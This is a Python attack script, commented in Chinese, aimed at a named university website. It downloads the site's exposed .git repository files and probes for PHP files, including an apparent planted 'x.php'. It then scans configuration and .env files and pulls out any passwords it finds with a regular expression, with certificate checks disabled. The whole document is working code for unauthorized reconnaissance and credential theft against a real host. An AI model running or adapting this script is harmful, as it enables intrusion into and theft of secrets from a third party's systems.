#!/usr/bin/env python3
import requests
import re
import os
urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th"
base_path = "/tmp/git_dump"
os.makedirs(base_path, exist_ok=True)

print("[*] 下载.git关键文件...")

# 下载HEAD获取commit hash
resp = requests.get(url + "/.git/HEAD", verify=False, timeout=5)
if resp.status_code == 200:
    head_ref = resp.text.strip()
    print(f"[+] HEAD: {head_ref}")
    
    # 如果是ref，获取实际commit
    if head_ref.startswith("ref: "):
        ref_path = head_ref.replace("ref: ", "").strip()
        resp2 = requests.get(url + "/.git/" + ref_path, verify=False, timeout=5)
        if resp2.status_code == 200:
            commit_hash = resp2.text.strip()
            print(f"[+] Commit: {commit_hash}")
            
            # 下载commit对象
            obj_path = f".git/objects/{commit_hash[:2]}/{commit_hash[2:]}"
            resp3 = requests.get(url + "/" + obj_path, verify=False, timeout=5)
            if resp3.status_code == 200:
                os.makedirs(f"{base_path}/objects/{commit_hash[:2]}", exist_ok=True)
                with open(f"{base_path}/objects/{commit_hash[:2]}/{commit_hash[2:]}", "wb") as f:
                    f.write(resp3.content)
                print(f"[+] 下载commit对象: {commit_hash}")

# 下载index文件查看所有文件
print("[*] 下载index文件...")
resp = requests.get(url + "/.git/index", verify=False, timeout=10)
if resp.status_code == 200:
    with open(f"{base_path}/index", "wb") as f:
        f.write(resp.content)
    print(f"[+] Index文件下载: {len(resp.content)} bytes")
    
    # 尝试解析index（简单提取文件名）
    try:
        content = resp.content
        # index文件包含文件名，尝试提取
        if b'x.php' in content:
            print("[+] Index中包含x.php文件")
        if b'config' in content:
            print("[+] Index中包含config文件")
    except:
        pass

# 下载config文件
print("[*] 下载.git/config...")
resp = requests.get(url + "/.git/config", verify=False, timeout=5)
if resp.status_code == 200:
    with open(f"{base_path}/config", "w") as f:
        f.write(resp.text)
    print("[+] Config下载成功")
    print(resp.text[:500])

# 尝试下载关键PHP文件
print("\n[*] 尝试直接下载PHP文件...")
php_files = [
    "/banpot/scmeeting/x.php",
    "/config.php",
    "/index.php",
    "/portal/index.php",
]

for php_file in php_files:
    resp = requests.get(url + php_file, verify=False, timeout=5)
    if resp.status_code == 200 and len(resp.text) > 10:
        print(f"[+] {php_file} 可访问 ({len(resp.text)} bytes)")
        if php_file.endswith("x.php"):
            print("=" * 70)
            print(resp.text)
            print("=" * 70)
            exit(0)
        elif "password" in resp.text.lower() or "database" in resp.text.lower():
            print(f"    [!] 包含敏感信息")
            print(resp.text[:500])

print("\n[*] 查找敏感文件...")
sensitive_files = [
    "/.env",
    "/database.php",
    "/db.php",
    "/config.inc.php",
    "/includes/config.php",
    "/application/config/database.php",
]

for sfile in sensitive_files:
    resp = requests.get(url + sfile, verify=False, timeout=3)
    if resp.status_code == 200:
        print(f"[+] {sfile} 可访问")
        if "password" in resp.text.lower():
            # 提取密码
            passwords = re.findall(r'password["\']?\s*[=:]\s*["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
            if passwords:
                print(f"    [!] 发现密码: {passwords[0]}")
